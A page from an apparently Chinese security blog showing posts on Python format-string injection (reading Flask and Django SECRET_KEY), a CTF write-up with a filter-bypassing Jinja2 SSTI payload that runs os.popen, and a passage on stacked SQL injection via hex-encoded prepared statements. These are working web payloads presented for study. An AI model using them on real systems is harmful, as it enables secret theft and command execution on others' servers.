<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="EVatom"><meta name="copyright" content="EVatom"><title>EVatom 's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="http://q2.qlogo.cn/headimg_dl?dst_uin=2466358849&amp;spec=160"></div><div class="author-info__name text-center">EVatom</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">10</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">3</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="http://hexo.imagemlt.xyz/" target="_blank" rel="noopener">Imagemlt</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/wfzWebSecuity/" target="_blank" rel="noopener">tr1ple</a><a class="author-info-links__name text-center" href="https://aryb1n.github.io/" target="_blank" rel="noopener">Aryb1n</a></div></div></div><nav id="nav" style="background-image: url(https://images.alphacoders.com/975/975730.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">EVatom 's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a></span></div><div id="site-info"><div id="site-title">EVatom 's Blog</div><div id="site-sub-title"></div><div id="site-social-icons"><a class="social-icon" href="https://github.com/YanLuOW" target="_blank" rel="noopener"><i class="fa-github fa"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/">Python格式化字符串研究</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-29</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Python-CTF/">Python CTF</a></span><div class="content"><h4 id="本文首发于合天智汇https-mp-weixin-qq-com-s-Ww1QviZyYxnNbIil-0BW2Q"><a href="#本文首发于合天智汇https-mp-weixin-qq-com-s-Ww1QviZyYxnNbIil-0BW2Q" class="headerlink" title="本文首发于合天智汇https://mp.weixin.qq.com/s/Ww1QviZyYxnNbIil_0BW2Q"></a>本文首发于合天智汇<a href="https://mp.weixin.qq.com/s/Ww1QviZyYxnNbIil_0BW2Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ww1QviZyYxnNbIil_0BW2Q</a></h4><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天与队友交流时提及python的格式化字符串漏洞，这个漏洞之前接触不多，所以写篇文章从基础部分仔细研究了研究。python环境是python3.7。</p>
<h2 id="Python3里的格式化字符串"><a href="#Python3里的格式化字符串" class="headerlink" title="Python3里的格式化字符串"></a>Python3里的格式化字符串</h2><p>python3中的格式化字符串主要有以下两种形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"test %s"</span> % (<span class="string">'test'</span>)</span><br><span class="line"><span class="string">"test &#123;0&#125;"</span>.format(<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure>

<p>这两个语句的输出都是test test。虽然效果一样，但是在python web的开发中一般认为前者比后者要安全，因为后者可能会因为自身支持的一些特殊用法导致配置信息等的泄露。</p>
<p>首先，format形式的格式化字符串基本用法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"I am &#123;1&#125;,he is &#123;0&#125;"</span>.format(<span class="string">"a"</span>,<span class="string">"b"</span>)</span><br></pre></td></tr></table></figure>

<p>这个语句的输出是<code>I am b,he is a</code>，大括号{}中的数字代表了format的变量顺序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;I am &#123;MyName&#125;,he is &#123;HisName&#125;&quot;.format(MyName=&quot;aa&quot;,HisName=&quot;bb&quot;)</span><br></pre></td></tr></table></figure>

<p>这个语句的输出是<code>I am aa,he is bb</code>，这种语句可以在format函数的参数通过key来赋值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"I am &#123;&#125;,he is &#123;&#125;"</span>.format(<span class="string">"a"</span>,<span class="string">"b"</span>)</span><br></pre></td></tr></table></figure>

<p>这个语句的输出是<code>I am a,he is b</code>，这样的用法会让大括号与format的参数一一对应。</p>
<p>当大括号与format的参数不能一一对应的时候便会报错，例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"I am &#123;0&#125;,he is also &#123;0&#125;"</span>.format(<span class="string">'a'</span>)</span><br><span class="line"><span class="string">"I am &#123;0&#125;,he is also &#123;1&#125;"</span>.format(<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<p>前者会输出<code>I am a,he is also a</code>，而后者会报错<code>tuple index out of range</code>。</p>
<p>这些format函数的基本用法并不是导致格式化字符串漏洞的根源，查看下列代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"first &#123;0[1]&#125;, second &#123;0&#125;"</span>.format([<span class="string">'a'</span>,<span class="string">'b'</span>])</span><br></pre></td></tr></table></figure>

<p>输出为<code>first b, second [&#39;a&#39;, &#39;b&#39;]</code>，可见当format函数的参数是一个列表时，可以通过用方括号添加索引的方式来获取列表的值。同样的，这种用法也可以用在类的属性上，比如以下代码会输出字符串a的内置属性__class__:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"&#123;0.__class__&#125;"</span>.format(<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure>

<p>输出结果是<code>&lt;class &#39;str&#39;&gt;</code></p>
<h2 id="一般利用"><a href="#一般利用" class="headerlink" title="一般利用"></a>一般利用</h2><p>python的格式化字符串的利用与沙盒逃逸或者python SSTI很相似，但format与后两者的区别在于它只能读取属性而不能执行方法，这就限制了格式化字符串的利用与攻击链的构造。举个例子，python SSTI中可以通过<code>&#39;a&#39;.__class__.__base__.__subclasses__()[12]</code>来获取任意类，但是由于format函数无法执行__subclasses__()这样的方法，直接把这种payload套进格式化字符串的利用中会报错<code>type object &#39;object&#39; has no attribute &#39;__subclasses__()&#39;</code>。</p>
<p>在与队友讨论时我们用的测试代码简化如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret.secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppendStr</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, message = <span class="string">'test'</span>)</span>:</span></span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    s = input(<span class="string">"test\n"</span>)</span><br><span class="line">    t = s + <span class="string">" by the way &#123;0&#125;"</span></span><br><span class="line">    print(t.format(AppendStr()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>

<p>可以看到这里format函数的参数是一个对象的实例，而secret保存在全局变量中。熟悉SSTI或者沙箱绕过的都知道，python的函数类有一个内置属性__globals__可以以字典的形式返回函数所在的全局命名空间所定义的全局变量。结合format函数的格式化字符串可以读取成员属性的特性，我们很容易知道只需通过一个调用链来获取一个函数类并读取它的__globals_<em>属性即可。这里我们可以使用这样的payload：`{0.<em>_class</em></em>.<strong>init</strong>.<strong>globals</strong>}<code>。由于AppendStr类定义了\_\_init\_\_函数，所以可以通过</code>{0.<strong>class</strong>.<strong>init</strong>}<code>来获取一个函数类</code>&lt;function AppendStr.<strong>init</strong> at 0x0000019C611D2730&gt;`，再读取这个类的__globals__属性来获取secret。这个思路也适用于一切的类的成员函数，假如把测试代码改为如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    s = input(<span class="string">"test\n"</span>)</span><br><span class="line">    t = s + <span class="string">" by the way &#123;0&#125;"</span></span><br><span class="line">    print(t.format(<span class="string">'test'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>

<p>如果机械地套用上边的payload会报错<code>&#39;wrapper_descriptor&#39; object has no attribute &#39;__globals__&#39;</code>。可以通过以下代码来查看字符串类的成员属性：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'a'</span>.__class__.__dict__)</span><br></pre></td></tr></table></figure>

<p>输出很多这里就不一一列举了。可以在输出的结果中看到字符串类并没有function类型的成员属性，所以不能通过格式化字符串来获得全局变量。</p>
<h2 id="Flask下读取secret-key"><a href="#Flask下读取secret-key" class="headerlink" title="Flask下读取secret_key"></a>Flask下读取secret_key</h2><p>把情景切换到flask下写出如下的测试代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'gasidfjbodnjgfnof'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppendStr</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, message = <span class="string">'test'</span>)</span>:</span></span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    template = <span class="string">'Hello &#123;0&#125;, This is your email: '</span> + request.args.get(<span class="string">'email'</span>)</span><br><span class="line">    <span class="keyword">return</span> template.format(AppendStr())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>, <span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>前置步骤与之前讲的相似，get方法提交参数<code>?email={0.__class__.__init__.__globals__}</code>可以看到当前的全局变量，然而secret_key并不会出现在返回中。我本地测试时返回的是这些数据：</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/5.png" alt></p>
<p>似乎不能简单粗暴地通过这个payload来获取secret_key，我们再看看flask的代码app.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 部分包及代码省略</span></span><br><span class="line"><span class="keyword">from</span> .config <span class="keyword">import</span> Config, ConfigAttribute</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flask</span><span class="params">(_PackageBoundObject)</span>:</span></span><br><span class="line"><span class="comment"># 注释省略</span></span><br><span class="line">	config_class = Config</span><br><span class="line">	</span><br><span class="line">	testing = ConfigAttribute(<span class="string">'TESTING'</span>)</span><br><span class="line">	</span><br><span class="line">    secret_key = ConfigAttribute(<span class="string">'SECRET_KEY'</span>)</span><br><span class="line">    </span><br><span class="line">    session_cookie_name = ConfigAttribute(<span class="string">'SESSION_COOKIE_NAME'</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到Flask类的属性secret_key会保存当前的secret_key的值，而上边返回的全局变量里有<code>&#39;app&#39;: &lt;Flask &#39;template&#39;&gt;</code>。我这个文件名是template，这就是当前的Flask类实例化的对象。所以只需要在上边那个payload后补充一些东西就能拿到secret_key，其内容如下：<code>?email={0.__class__.__init__.__globals__[app].secret_key}</code>。</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/6.png" alt></p>
<h2 id="django下读取SECRET-KEY"><a href="#django下读取SECRET-KEY" class="headerlink" title="django下读取SECRET_KEY"></a>django下读取SECRET_KEY</h2><p>p师傅很早以前写过一篇文章讲解过这个利用方法，其链接如下：<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html。p师傅在文章中给出了两个payload，但并没有仔细讲解其原理。所以我这里就逐步分析下其中一个payload的构造，另一个payload思路类似。测试代码如下：" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html。p师傅在文章中给出了两个payload，但并没有仔细讲解其原理。所以我这里就逐步分析下其中一个payload的构造，另一个payload思路类似。测试代码如下：</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    template = <span class="string">'Hello &#123;user&#125;, This is your email: '</span> + request.GET.get(<span class="string">'email'</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>

<p>在未登录状态下，request.user是类AnonymousUser的实例化对象，类定义在django/contrib/auth/models.py文件中395行：</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/1.png" alt></p>
<p>402行看到该对象的_groups属性是一个EmptyManager类的对象。429行可知该对象的groups方法也被转化为了名为groups且值与_groups相同的类属性。EmptyManager类定义在django/db/models/manager.py的195行</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/2.png" alt></p>
<p>可以看到这个对象的model属性是与AnonymousUser类定义在同一个文件中的Group类，在django/contrib/auth/models.py文件中91行：</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/3.png" alt></p>
<p>Group类本身定义的东西没什么好看的，一路跟随至其父类的父类ModelBase，定义在django/db/models/base.py的71行，有）：</p>
<p><img src="/2020/02/29/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%A0%94%E7%A9%B6/4.png" alt></p>
<p>在121行可以看到该类的_meta属性是一个Options类实例化的对象。跟踪至django/db/models/options.py的65行可以看到类定义（此处由于代码太长不截图了）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.apps <span class="keyword">import</span> apps</span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Options</span>:</span></span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line">    default_apps = apps</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, meta, app_label=None)</span>:</span></span><br><span class="line">		self.app_label = app_label</span><br><span class="line">        self.apps = self.default_apps</span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">app_config</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># Don't go through get_app_config to avoid triggering imports.</span></span><br><span class="line">        <span class="keyword">return</span> self.apps.app_configs.get(self.app_label)</span><br><span class="line"><span class="comment"># 省略</span></span><br></pre></td></tr></table></figure>

<p>可以看到app_config方法被转化为了只读属性，而该属性返回<code>self.apps.app_configs.get(self.app_label)</code>。审计代码可以清楚得发现self.apps就是导入的apps模块，即一个module类的对象。跟踪至django/apps/registry.py，可以看到类Apps的定义里，即原文件13行有</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apps</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, installed_apps=<span class="params">()</span>)</span>:</span></span><br><span class="line">        self.app_configs = &#123;&#125;</span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">populate</span><span class="params">(self, installed_apps=None)</span>:</span></span><br><span class="line"><span class="comment"># 省略    </span></span><br><span class="line">            <span class="keyword">for</span> entry <span class="keyword">in</span> installed_apps:</span><br><span class="line">                <span class="keyword">if</span> isinstance(entry, AppConfig):</span><br><span class="line">                    app_config = entry</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app_config = AppConfig.create(entry) <span class="comment"># 91行</span></span><br><span class="line">                <span class="keyword">if</span> app_config.label <span class="keyword">in</span> self.app_configs:</span><br><span class="line">                    <span class="keyword">raise</span> ImproperlyConfigured(</span><br><span class="line">                        <span class="string">"Application labels aren't unique, "</span></span><br><span class="line">                        <span class="string">"duplicates: %s"</span> % app_config.label)</span><br><span class="line"></span><br><span class="line">                self.app_configs[app_config.label] = app_config <span class="comment"># 97行</span></span><br></pre></td></tr></table></figure>

<p>跟踪91行的AppConfig.create至django/apps/config.py，有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span>:</span></span><br><span class="line"><span class="comment"># 省略</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(cls, entry)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            module = import_module(entry)</span><br></pre></td></tr></table></figure>

<p>这个Options类实例化的对象的app_config属性返回会返回一个对象，而这个对象的module属性是python的一个模块即module。而对于我的测试代码这种情景，module的内容为<code>&lt;module &#39;django.contrib.auth&#39; from &#39;C:\\python37\\lib\\site-packages\\django\\contrib\\auth\\__init__.py&#39;&gt;</code>。查看该模块的代码，可以在文件django/contrib/auth/admin.py中看到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="comment"># 省略</span></span><br></pre></td></tr></table></figure>

<p>settings模块里就有我们需要的SECRET_KEY。故我们可以通过简单的模块包含关系利用格式化字符串漏洞来读取SECRET_KEY，故最终payload如下：<code>[{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}]</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%88%98%E7%96%AB%E8%B5%9Bweb1%E9%A2%98%E8%A7%A3/">安恒杯战疫赛web1题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-26</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><p>就看了这一道题，简单记录下</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>提示了是Flask，猜测404页面存在SSTI，提交/1发现SSTI确实存在。简单fuzz后发现关键字过滤不多，就一个config，但是下划线_以及点号.都被过滤掉了，直接导致了__class__以及.read()这样的语句行不通。点号可以通过[“read”]()来代替.read()，而下划线的过滤参考这篇文章<a href="https://www.jianshu.com/p/a736e39c3510，用\x5f代替下划线（该写法不能用在python语句里）。所以可以用[&quot;\x5f\x5fclass\x5f\x5f&quot;]代替.\__class__。" target="_blank" rel="noopener">https://www.jianshu.com/p/a736e39c3510，用\x5f代替下划线（该写法不能用在python语句里）。所以可以用[&quot;\x5f\x5fclass\x5f\x5f&quot;]代替.\__class__。</a></p>
<p>用语句</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>[<span class="string">"\x5f\x5fclass\x5f\x5f"</span>][<span class="string">"\x5f\x5fmro\x5f\x5f"</span>][<span class="number">1</span>][<span class="string">"\x5f\x5fsubclasses\x5f\x5f"</span>]()[<span class="number">30</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>来找到warnings.WarningMessage类，再通过__builtins__找到__import__来导入os模块。</p>
<p>最终payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>[<span class="string">"\x5f\x5fclass\x5f\x5f"</span>][<span class="string">"\x5f\x5fmro\x5f\x5f"</span>][<span class="number">1</span>][<span class="string">"\x5f\x5fsubclasses\x5f\x5f"</span>]()[<span class="number">30</span>][<span class="string">"\x5f\x5finit\x5f\x5f"</span>][<span class="string">"\x5f\x5fglobals\x5f\x5f"</span>][<span class="string">"\x5f\x5fbuiltins\x5f\x5f"</span>][<span class="string">'\x5f\x5fimport\x5f\x5f'</span>](<span class="string">'os'</span>)[<span class="string">"popen"</span>](<span class="string">'cat%20/webapp/start*'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>在start.sh里找到flag</p>
<p><img src="/2020/02/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%88%98%E7%96%AB%E8%B5%9Bweb1%E9%A2%98%E8%A7%A3/1.png" alt></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/17/ByteCTF2019%E4%B8%8EHBCTF2017%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/">ByteCTF2019与HBCTF2017两道web题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-17</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="ByteCTF2019-Babyblog"><a href="#ByteCTF2019-Babyblog" class="headerlink" title="ByteCTF2019 Babyblog"></a>ByteCTF2019 Babyblog</h2><p><a href="http://www.zip下载源码，在edit.php处发现二次注入：" target="_blank" rel="noopener">www.zip下载源码，在edit.php处发现二次注入：</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($sql-&gt;query(<span class="string">"select * from article where id="</span> . intval($_POST[<span class="string">'id'</span>]) . <span class="string">";"</span>) <span class="keyword">as</span> $v)&#123;</span><br><span class="line">		$row = $v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'id'</span>] == $row[<span class="string">'userid'</span>])&#123;</span><br><span class="line">		$title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">		$content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">		$sql-&gt;query(<span class="string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="string">'title'</span>] . <span class="string">"';"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在config.php里可以看到执行sql语句用的是PDO</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=localhost;dbname=babyblog"</span>, <span class="string">'CTF2019'</span>, <span class="string">'*************'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"SQL Server Down T.T"</span>);</span><br></pre></td></tr></table></figure>

<p>对于PDO模式，控制多句执行的PDO::MYSQL_ATTR_MULTI_STATEMENTS设置项是默认开启的，所以可以利用这个二次注入进行堆叠注入来把我们的账户改为vip账户。由于SafeFilter函数把update过滤掉了，这里可以使用预编译进行绕过。PDO模式下控制预编译的PDO::ATTR_EMULATE_PREPARES设置项也是默认开启的，所以这里先把title设置为<code>&#39;;SeT@x=0x757064617465207573657273207365742069737669703D3120776865726520757365726E616D653D2731323327;prepare a from @x;execute a;#</code>，通过把字符串转换为16进制的方式来绕过过滤。再进行一次编辑就可以触发堆叠注入使得账号变为vip并可以访问replace.php。在replace.php里看到</p>
